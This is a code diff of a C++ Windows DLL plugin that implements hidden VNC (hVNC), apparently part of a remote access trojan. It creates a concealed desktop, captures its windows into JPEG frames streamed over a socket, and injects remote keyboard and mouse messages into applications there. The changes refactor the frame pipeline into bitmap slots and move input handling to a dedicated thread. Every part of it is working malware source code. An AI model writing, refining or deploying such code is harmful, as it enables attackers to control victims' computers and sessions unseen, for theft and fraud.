@@ -99,8 +99,15 @@ static int g_canvasH = 1080;
 static mutex g_gdiplusMutex;
 static ULONG_PTR g_gdiplusToken = 0;
 
-// Capture -> Encode -> Send pipeline
+struct BitmapSlot {
+    HBITMAP hBmp = NULL;
+    int width = 0;
+    int height = 0;
+    bool inUse = false;
+};
+
 struct CapturedFrame {
+    int slotIndex;
     int width;
     int height;
     int scale;
@@ -121,7 +128,9 @@ struct EncodedFrame {
     uint32_t format;
 };
 
+static const size_t MAX_CAPTURE_QUEUE = 2;
 static const size_t MAX_SEND_QUEUE = 2;
+static vector<BitmapSlot> g_bitmapSlots(2);
 static deque<CapturedFrame> g_captureQueue;
 static deque<EncodedFrame> g_sendQueue;
 static mutex g_frameMutex;
@@ -134,23 +143,17 @@ static atomic_bool g_sendRunning(false);
 static mutex g_logMutex;
 
 // Input Worker
-struct HvncInput {
-    string t; // mm, mc, mw, kd, ku
-    int x = -1;
-    int y = -1;
-    int button = -1; // 0=left, 1=right, 2=middle
-    bool down = false;
-    int wheelDelta = 0;
-    int vk = 0;
+struct InputTask {
+    string action;
+    json cmd;
 };
-
-static deque<HvncInput> g_inputQueue;
+static deque<InputTask> g_inputQueue;
 static mutex g_inputMutex;
 static condition_variable g_inputCV;
 static thread g_inputThread;
 static atomic_bool g_inputRunning(false);
 
-// Window caching and composite canvas
+// Window caching
 struct WinCache {
     HDC hdc = NULL;
     HBITMAP hbm = NULL;
@@ -161,12 +164,8 @@ struct WinCache {
 
 static std::map<HWND, WinCache> g_winCache;
 static HDC g_compHdcRef = NULL;
-static HDC g_compHdc = NULL;
-static HBITMAP g_compHbm = NULL;
-static void* g_compBits = nullptr;
-static int g_compW = 0, g_compH = 0;
 
-// Drag state & coordinates
+// Coordinates & state
 static int g_curX = 960, g_curY = 540;
 static bool g_movingWindow = false;
 static HWND g_movingHwnd = NULL;
@@ -333,36 +332,6 @@ static int get_encoder_clsid(const WCHAR* mimeType, CLSID* clsid) {
     return -1;
 }
 
-static bool bitmap_to_jpeg_from_bits(void* bits, int width, int height, int stride, ULONG quality, vector<unsigned char>& bytes) {
-    if (!ensure_gdiplus()) return false;
-    static CLSID clsid;
-    static bool clsidReady = false;
-    if (!clsidReady) {
-        if (get_encoder_clsid(L"image/jpeg", &clsid) < 0) return false;
-        clsidReady = true;
-    }
-    // GDI+ PixelFormat32bppRGB matches our BGRA DIBSection layout (0x26200A)
-    Bitmap bmp(width, height, stride, PixelFormat32bppRGB, (BYTE*)bits);
-    IStream* stream = NULL;
-    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) != S_OK) return false;
-    EncoderParameters params;
-    params.Count = 1;
-    params.Parameter[0].Guid              = EncoderQuality;
-    params.Parameter[0].Type             = EncoderParameterValueTypeLong;
-    params.Parameter[0].NumberOfValues   = 1;
-    params.Parameter[0].Value            = &quality;
-    if (bmp.Save(stream, &clsid, &params) != Ok) { stream->Release(); return false; }
-    STATSTG stat;
-    stream->Stat(&stat, STATFLAG_NONAME);
-    bytes.resize((size_t)stat.cbSize.QuadPart);
-    LARGE_INTEGER li = {0};
-    stream->Seek(li, STREAM_SEEK_SET, NULL);
-    ULONG read;
-    stream->Read(bytes.data(), (ULONG)bytes.size(), &read);
-    stream->Release();
-    return true;
-}
-
 static bool bitmap_to_jpeg_from_hbmp(HBITMAP hBmp, ULONG quality, vector<unsigned char>& bytes) {
     if (!ensure_gdiplus()) return false;
     static CLSID clsid;
@@ -445,32 +414,6 @@ static void FreeWinCache() {
     g_winCache.clear();
 }
 
-static bool EnsureComposite(int w, int h) {
-    if (g_compHdc && g_compW == w && g_compH == h) return true;
-    if (g_compHbm) { DeleteObject(g_compHbm); g_compHbm = NULL; }
-    if (g_compHdc) { DeleteDC(g_compHdc);     g_compHdc = NULL; }
-    g_compBits = nullptr;
-    g_compW = 0; g_compH = 0;
-
-    g_compHdc = CreateCompatibleDC(g_compHdcRef);
-    if (!g_compHdc) return false;
-    BITMAPINFO bmi = MakeBmi(w, h);
-    g_compHbm = CreateDIBSection(g_compHdcRef, &bmi, DIB_RGB_COLORS, &g_compBits, NULL, 0);
-    if (!g_compHbm || !g_compBits) {
-        DeleteDC(g_compHdc); g_compHdc = NULL;
-        return false;
-    }
-    SelectObject(g_compHdc, g_compHbm);
-    g_compW = w; g_compH = h;
-    return true;
-}
-
-static void FreeComposite() {
-    if (g_compHbm) { DeleteObject(g_compHbm); g_compHbm = NULL; }
-    if (g_compHdc) { DeleteDC(g_compHdc);     g_compHdc = NULL; }
-    g_compBits = nullptr; g_compW = 0; g_compH = 0;
-}
-
 static void ensure_desktop() {
     if (g_hHiddenDesktop) return;
 
@@ -484,6 +427,80 @@ static void ensure_desktop() {
     if (!g_hHiddenDesktop) {
         g_hHiddenDesktop = CreateDesktopW(g_desktopName.c_str(), NULL, NULL, 0, GENERIC_ALL, NULL);
     }
+}
+
+// -------------------------------------------------------------------------
+//  Pipeline Slot Allocation
+// -------------------------------------------------------------------------
+
+static void release_slot_locked(int slotIndex) {
+    if (slotIndex >= 0 && slotIndex < (int)g_bitmapSlots.size()) {
+        g_bitmapSlots[slotIndex].inUse = false;
+    }
+}
+
+static bool has_free_frame_slot_locked() {
+    for (const BitmapSlot& slot : g_bitmapSlots) {
+        if (!slot.inUse) return true;
+    }
+    return !g_captureQueue.empty();
+}
+
+static int acquire_frame_slot_locked(HDC hdcScreen, int width, int height) {
+    int slotIndex = -1;
+    for (size_t i = 0; i < g_bitmapSlots.size(); ++i) {
+        if (!g_bitmapSlots[i].inUse) {
+            slotIndex = (int)i;
+            break;
+        }
+    }
+
+    while (slotIndex < 0 && !g_captureQueue.empty()) {
+        CapturedFrame oldFrame = g_captureQueue.front();
+        g_captureQueue.pop_front();
+        release_slot_locked(oldFrame.slotIndex);
+        for (size_t i = 0; i < g_bitmapSlots.size(); ++i) {
+            if (!g_bitmapSlots[i].inUse) {
+                slotIndex = (int)i;
+                break;
+            }
+        }
+    }
+
+    if (slotIndex < 0) return -1;
+
+    BitmapSlot& slot = g_bitmapSlots[slotIndex];
+    if (!slot.hBmp || slot.width != width || slot.height != height) {
+        if (slot.hBmp) {
+            DeleteObject(slot.hBmp);
+            slot.hBmp = NULL;
+        }
+        slot.hBmp = CreateCompatibleBitmap(hdcScreen, width, height);
+        slot.width = width;
+        slot.height = height;
+    }
+    if (!slot.hBmp) return -1;
+
+    slot.inUse = true;
+    return slotIndex;
+}
+
+static bool read_bitmap_pixels(HBITMAP hBmp, int width, int height, vector<uint32_t>& pixels) {
+    if (!hBmp || width <= 0 || height <= 0) return false;
+
+    BITMAPINFO bmi{};
+    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+    bmi.bmiHeader.biWidth = width;
+    bmi.bmiHeader.biHeight = -height;
+    bmi.bmiHeader.biPlanes = 1;
+    bmi.bmiHeader.biBitCount = 32;
+    bmi.bmiHeader.biCompression = BI_RGB;
+
+    pixels.resize((size_t)width * (size_t)height);
+    HDC hdc = GetDC(NULL);
+    int rows = GetDIBits(hdc, hBmp, 0, (UINT)height, pixels.data(), &bmi, DIB_RGB_COLORS);
+    ReleaseDC(NULL, hdc);
+    return rows == height;
 }
 
 // -------------------------------------------------------------------------
@@ -652,17 +669,22 @@ static void encode_worker() {
 
     while (g_encodeRunning) {
         CapturedFrame data{};
+        HBITMAP hBmp = NULL;
         {
             unique_lock<mutex> lock(g_frameMutex);
             g_frameCV.wait(lock, [] { return !g_captureQueue.empty() || !g_encodeRunning; });
             if (!g_encodeRunning && g_captureQueue.empty()) break;
 
             while (g_captureQueue.size() > 1) {
+                release_slot_locked(g_captureQueue.front().slotIndex);
                 g_captureQueue.pop_front();
             }
 
             data = g_captureQueue.front();
             g_captureQueue.pop_front();
+            if (data.slotIndex >= 0 && data.slotIndex < (int)g_bitmapSlots.size()) {
+                hBmp = g_bitmapSlots[data.slotIndex].hBmp;
+            }
         }
 
         vector<unsigned char> jpeg;
@@ -672,10 +694,7 @@ static void encode_worker() {
         bool encoded = false;
         uint32_t format = FRAME_FORMAT_JPEG;
 
-        // Perform dirty rect checks using composite canvas memory directly
-        if (g_compBits) {
-            currentPixels.resize(data.width * data.height);
-            std::memcpy(currentPixels.data(), g_compBits, data.width * data.height * sizeof(uint32_t));
+        if (hBmp && read_bitmap_pixels(hBmp, data.width, data.height, currentPixels)) {
             hasDirty = find_dirty_rect(currentPixels, previousPixels, data.width, data.height, dirty, forceFull);
         } else {
             hasDirty = true;
@@ -698,8 +717,8 @@ static void encode_worker() {
             bool useDirty = !forceFull && dirtyWidth > 0 && dirtyHeight > 0 &&
                             (dirtyWidth * dirtyHeight) < ((data.width * data.height) * 85 / 100);
 
-            if (useDirty && g_compHbm &&
-                copy_bitmap_region(g_compHbm, dirty.left, dirty.top, dirtyWidth, dirtyHeight,
+            if (useDirty &&
+                copy_bitmap_region(hBmp, dirty.left, dirty.top, dirtyWidth, dirtyHeight,
                                    hCrop, hdcSource, hdcCrop, hOldSource, hOldCrop,
                                    cropWidth, cropHeight)) {
                 encoded = bitmap_to_jpeg_from_hbmp(hCrop, (ULONG)data.scale, jpeg);
@@ -709,12 +728,17 @@ static void encode_worker() {
                 dirty.top = 0;
                 dirty.right = data.width;
                 dirty.bottom = data.height;
-                encoded = bitmap_to_jpeg_from_bits(g_compBits, data.width, data.height, data.width * 4, (ULONG)data.scale, jpeg);
+                encoded = bitmap_to_jpeg_from_hbmp(hBmp, (ULONG)data.scale, jpeg);
                 format = FRAME_FORMAT_JPEG;
             }
             g_staticFrameCount = 0;
         } else {
             g_staticFrameCount++;
+        }
+
+        {
+            lock_guard<mutex> lock(g_frameMutex);
+            release_slot_locked(data.slotIndex);
         }
 
         if (encoded) {
@@ -750,7 +774,10 @@ static void encode_worker() {
     DeleteDC(hdcCrop);
 
     lock_guard<mutex> lock(g_frameMutex);
-    g_captureQueue.clear();
+    while (!g_captureQueue.empty()) {
+        release_slot_locked(g_captureQueue.front().slotIndex);
+        g_captureQueue.pop_front();
+    }
 }
 
 static void send_worker() {
@@ -796,38 +823,23 @@ static void capture_loop() {
     g_canvasW = sw;
     g_canvasH = sh;
 
+    HDC hdcScreen = GetDC(NULL);
+    HDC hdcMem    = CreateCompatibleDC(hdcScreen);
+    HBITMAP hbmpMem = CreateCompatibleBitmap(hdcScreen, sw, sh);
+    HGDIOBJ hOldMem = SelectObject(hdcMem, hbmpMem);
+
+    HDC hdcWin = CreateCompatibleDC(hdcScreen);
+    HBITMAP hbmpWin = NULL;
+    HGDIOBJ hOldWin = NULL;
+    int winBmpWidth = 0;
+    int winBmpHeight = 0;
+
+    HDC hdcFinal = CreateCompatibleDC(hdcScreen);
+
     DWORD lastFullFrame = 0;
 
     while (g_captureRunning) {
         DWORD start = GetTickCount();
-
-        // Process any queued input task on the capture thread so they have correct desktop context
-        {
-            unique_lock<mutex> inputLock(g_inputMutex);
-            while (!g_inputQueue.empty()) {
-                auto inp = g_inputQueue.front();
-                g_inputQueue.pop_front();
-                inputLock.unlock();
-
-                // Process input directly
-                if (inp.t == "mm") {
-                    g_curX = inp.x; g_curY = inp.y;
-                    SetCursorPos(inp.x, inp.y);
-                    if (g_movingWindow && g_movingHwnd) {
-                        SetWindowPos(g_movingHwnd, NULL, inp.x - g_moveOffX, inp.y - g_moveOffY, g_moveSizeW, g_moveSizeH, SWP_NOZORDER | SWP_NOACTIVATE);
-                    } else {
-                        POINT pt = { inp.x, inp.y };
-                        HWND hwnd = WindowFromPoint(pt); // We can use WindowFromPoint or SmartWindowFromPoint
-                        if (hwnd) {
-                            POINT cPt = pt;
-                            ScreenToClient(hwnd, &cPt);
-                            PostMessageW(hwnd, WM_MOUSEMOVE, g_leftButtonDown ? MK_LBUTTON : 0, MAKELPARAM(cPt.x, cPt.y));
-                        }
-                    }
-                }
-                inputLock.lock();
-            }
-        }
 
         int scale, fps;
         {
@@ -845,13 +857,22 @@ static void capture_loop() {
         int dh = (sh * scale) / 100;
         if (dw < 1) dw = 1; if (dh < 1) dh = 1;
 
-        if (!EnsureComposite(dw, dh)) {
-            std::this_thread::sleep_for(std::chrono::milliseconds(33));
+        int slotIndex = -1;
+        {
+            lock_guard<mutex> lock(g_frameMutex);
+            if (has_free_frame_slot_locked()) {
+                slotIndex = acquire_frame_slot_locked(hdcScreen, dw, dh);
+            }
+        }
+
+        if (slotIndex < 0) {
+            DWORD interval = 1000 / (fps > 0 ? fps : 1);
+            Sleep(max<DWORD>(5, interval / 2));
             continue;
         }
 
-        // Clean canvas
-        std::memset(g_compBits, 0, dw * dh * 4);
+        // Fill background
+        PatBlt(hdcMem, 0, 0, sw, sh, BLACKNESS);
 
         DWORD now = GetTickCount();
         DWORD fullFrameInterval = staticFrames > 30 ? 7000 : 3000;
@@ -901,54 +922,62 @@ static void capture_loop() {
             }
         }
 
-        SetStretchBltMode(g_compHdc, COLORONCOLOR);
-
         for (auto& item : toProcess) {
             HWND hwnd = item.first;
             RECT r = item.second;
             int ww = r.right - r.left;
             int wh = r.bottom - r.top;
 
-            WinCache* entry = GetOrCreateCache(hwnd, ww, wh);
-            if (!entry) continue;
+            if (!hbmpWin || ww > winBmpWidth || wh > winBmpHeight) {
+                if (hbmpWin) {
+                    SelectObject(hdcWin, hOldWin);
+                    DeleteObject(hbmpWin);
+                    hbmpWin = NULL;
+                    hOldWin = NULL;
+                }
+                hbmpWin = CreateCompatibleBitmap(hdcScreen, ww, wh);
+                if (!hbmpWin) continue;
+                hOldWin = SelectObject(hdcWin, hbmpWin);
+                winBmpWidth = ww;
+                winBmpHeight = wh;
+            }
 
-            bool printSuccess = PrintWindow(hwnd, entry->hdc, PW_RENDERFULLCONTENT);
+            PatBlt(hdcWin, 0, 0, ww, wh, BLACKNESS);
+            bool printSuccess = PrintWindow(hwnd, hdcWin, PW_RENDERFULLCONTENT);
             if (!printSuccess) {
-                printSuccess = PrintWindow(hwnd, entry->hdc, 0);
+                printSuccess = PrintWindow(hwnd, hdcWin, 0);
             }
             if (!printSuccess) {
                 HDC hdcRealWin = GetWindowDC(hwnd);
                 if (hdcRealWin) {
-                    BitBlt(entry->hdc, 0, 0, ww, wh, hdcRealWin, 0, 0, SRCCOPY);
+                    BitBlt(hdcWin, 0, 0, ww, wh, hdcRealWin, 0, 0, SRCCOPY);
                     ReleaseDC(hwnd, hdcRealWin);
                 } else {
                     continue;
                 }
             }
 
-            // Clip dest and scale onto composite canvas directly using StretchBlt
-            int dstX = (r.left * scale) / 100;
-            int dstY = (r.top * scale) / 100;
-            int dstW = (ww * scale) / 100;
-            int dstH = (wh * scale) / 100;
-
-            StretchBlt(g_compHdc, dstX, dstY, dstW, dstH, entry->hdc, 0, 0, ww, wh, SRCCOPY);
+            BitBlt(hdcMem, r.left, r.top, ww, wh, hdcWin, 0, 0, SRCCOPY);
         }
 
         // Draw cursor
         HCURSOR hArrow = LoadCursorW(NULL, (LPCWSTR)32512); // IDC_ARROW = 32512
         if (hArrow && g_curX >= 0 && g_curY >= 0 && g_curX < sw && g_curY < sh) {
-            int cx = (g_curX * scale) / 100;
-            int cy = (g_curY * scale) / 100;
-            DrawIconEx(g_compHdc, cx, cy, hArrow, 0, 0, 0, NULL, DI_NORMAL);
+            DrawIconEx(hdcMem, g_curX, g_curY, hArrow, 0, 0, 0, NULL, DI_NORMAL);
         }
+
+        HGDIOBJ hOldFinal = SelectObject(hdcFinal, g_bitmapSlots[slotIndex].hBmp);
+        SetStretchBltMode(hdcFinal, COLORONCOLOR);
+        StretchBlt(hdcFinal, 0, 0, dw, dh, hdcMem, 0, 0, sw, sh, SRCCOPY);
+        SelectObject(hdcFinal, hOldFinal);
 
         {
             lock_guard<mutex> lock(g_frameMutex);
-            while (g_captureQueue.size() >= 2) {
+            while (g_captureQueue.size() >= MAX_CAPTURE_QUEUE) {
+                release_slot_locked(g_captureQueue.front().slotIndex);
                 g_captureQueue.pop_front();
             }
-            g_captureQueue.push_back({dw, dh, scale, fps, forceFullFrame});
+            g_captureQueue.push_back({slotIndex, dw, dh, scale, fps, forceFullFrame});
             if (forceFullFrame) lastFullFrame = now;
             g_frameCV.notify_one();
         }
@@ -958,8 +987,18 @@ static void capture_loop() {
         if (elapsed < interval) Sleep(interval - elapsed);
     }
 
+    SelectObject(hdcMem, hOldMem);
+    if (hbmpWin) {
+        SelectObject(hdcWin, hOldWin);
+        DeleteObject(hbmpWin);
+    }
+    DeleteObject(hbmpMem);
+    DeleteDC(hdcMem);
+    DeleteDC(hdcWin);
+    DeleteDC(hdcFinal);
+    ReleaseDC(NULL, hdcScreen);
+
     FreeWinCache();
-    FreeComposite();
     if (g_compHdcRef) { ReleaseDC(0, g_compHdcRef); g_compHdcRef = NULL; }
 }
 
@@ -1323,6 +1362,72 @@ static void HandleKey(int vk, bool down) {
     }
 
     PostMessageW(hwnd, down ? WM_KEYDOWN : WM_KEYUP, (WPARAM)vk, down ? lpDn : lpUp);
+}
+
+// -------------------------------------------------------------------------
+//  Input Thread Loop
+// -------------------------------------------------------------------------
+
+static void input_loop() {
+    ensure_desktop();
+    if (!g_hHiddenDesktop) { g_inputRunning = false; return; }
+    if (!SetThreadDesktop(g_hHiddenDesktop)) { g_inputRunning = false; return; }
+
+    while (g_inputRunning) {
+        InputTask task;
+        {
+            unique_lock<mutex> lock(g_inputMutex);
+            g_inputCV.wait(lock, [] { return !g_inputQueue.empty() || !g_inputRunning; });
+            if (!g_inputRunning) {
+                g_inputQueue.clear();
+                break;
+            }
+            task = g_inputQueue.front();
+            g_inputQueue.pop_front();
+        }
+
+        const string& action = task.action;
+        const json&   cmd    = task.cmd;
+
+        if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
+            int vk = cmd.value("keycode", 0);
+            bool down = (action == "hvnc_keydown" || action == "hvnc_char");
+            if (action == "hvnc_char") {
+                POINT pt = {g_curX, g_curY};
+                HWND hwnd = WindowFromPoint(pt);
+                if (!hwnd) hwnd = g_lastHwnd;
+                if (!hwnd) hwnd = GetForegroundWindow();
+                if (hwnd) {
+                    PostMessageW(hwnd, WM_CHAR, (WPARAM)vk, 1);
+                }
+            } else {
+                HandleKey(vk, down);
+            }
+            request_full_frame(true);
+        } else if (action == "hvnc_mousemove") {
+            int normX = cmd.value("x", 0);
+            int normY = cmd.value("y", 0);
+            int x = (normX * g_canvasW) / 65535;
+            int y = (normY * g_canvasH) / 65535;
+            HandleMouseMove(x, y);
+            request_full_frame(false);
+        } else if (action == "hvnc_mousedown" || action == "hvnc_mouseup" || action == "hvnc_doubleclick") {
+            int normX = cmd.value("x", 0);
+            int normY = cmd.value("y", 0);
+            int button = cmd.value("button", 0);
+            int x = (normX * g_canvasW) / 65535;
+            int y = (normY * g_canvasH) / 65535;
+            bool down = (action == "hvnc_mousedown" || action == "hvnc_doubleclick");
+
+            HandleMouseButton(x, y, button, down);
+            if (action == "hvnc_doubleclick") {
+                HandleMouseButton(x, y, button, false);
+                HandleMouseButton(x, y, button, true);
+                HandleMouseButton(x, y, button, false);
+            }
+            request_full_frame(true);
+        }
+    }
 }
 
 // -------------------------------------------------------------------------
@@ -2331,19 +2436,25 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                 if (g_captureThread.joinable()) g_captureThread.join();
                 g_captureThread = thread(capture_loop);
             }
+            if (!g_inputRunning.exchange(true)) {
+                if (g_inputThread.joinable()) g_inputThread.join();
+                g_inputThread = thread(input_loop);
+            }
         } else if (action == "hvnc_stop") {
             g_captureRunning = false;
             g_encodeRunning  = false;
             g_sendRunning    = false;
+            g_inputRunning   = false;
             g_frameCV.notify_all();
             g_sendCV.notify_all();
+            g_inputCV.notify_all();
 
             if (g_captureThread.joinable()) g_captureThread.join();
             if (g_encodeThread.joinable())  g_encodeThread.join();
             if (g_sendThread.joinable())    g_sendThread.join();
+            if (g_inputThread.joinable())   g_inputThread.join();
 
             FreeWinCache();
-            FreeComposite();
 
             g_movingWindow = false;
             g_movingHwnd = NULL;
@@ -2408,46 +2519,30 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             }).detach();
         } else if (action == "hvnc_mousemove") {
             lock_guard<mutex> lock(g_inputMutex);
-            HvncInput inp;
-            inp.t = "mm";
-            inp.x = cmd.value("x", 0);
-            inp.y = cmd.value("y", 0);
-            // Translate norm coordinates back
-            inp.x = (inp.x * g_canvasW) / 65535;
-            inp.y = (inp.y * g_canvasH) / 65535;
-            g_inputQueue.push_back(inp);
-        } else if (action == "hvnc_mousedown" || action == "hvnc_mouseup" || action == "hvnc_doubleclick") {
-            int normX = cmd.value("x", 0);
-            int normY = cmd.value("y", 0);
-            int button = cmd.value("button", 0);
-            int x = (normX * g_canvasW) / 65535;
-            int y = (normY * g_canvasH) / 65535;
-            bool down = (action == "hvnc_mousedown" || action == "hvnc_doubleclick");
+            InputTask task;
+            task.action = "hvnc_mousemove";
+            task.cmd = cmd;
 
-            HandleMouseButton(x, y, button, down);
-            if (action == "hvnc_doubleclick") {
-                // Synthesize double click messages immediately
-                HandleMouseButton(x, y, button, false);
-                HandleMouseButton(x, y, button, true);
-                HandleMouseButton(x, y, button, false);
+            // Prevent queue saturation by consolidating mousemovements
+            if (!g_inputQueue.empty() && g_inputQueue.back().action == "hvnc_mousemove") {
+                g_inputQueue.pop_back();
             }
-            request_full_frame(true);
-        } else if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
-            int vk = cmd.value("keycode", 0);
-            bool down = (action == "hvnc_keydown" || action == "hvnc_char");
-            if (action == "hvnc_char") {
-                // Post WM_CHAR
-                POINT pt = {g_curX, g_curY};
-                HWND hwnd = WindowFromPoint(pt);
-                if (!hwnd) hwnd = g_lastHwnd;
-                if (!hwnd) hwnd = GetForegroundWindow();
-                if (hwnd) {
-                    PostMessageW(hwnd, WM_CHAR, (WPARAM)vk, 1);
-                }
-            } else {
-                HandleKey(vk, down);
+            while (g_inputQueue.size() > 128) {
+                g_inputQueue.pop_front();
             }
-            request_full_frame(true);
+            g_inputQueue.push_back(task);
+            g_inputCV.notify_one();
+        } else if (action == "hvnc_mousedown" || action == "hvnc_mouseup" || action == "hvnc_doubleclick" ||
+                   action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
+            lock_guard<mutex> lock(g_inputMutex);
+            InputTask task;
+            task.action = action;
+            task.cmd = cmd;
+            while (g_inputQueue.size() > 128) {
+                g_inputQueue.pop_front();
+            }
+            g_inputQueue.push_back(task);
+            g_inputCV.notify_one();
         }
     } catch (...) {}
 }
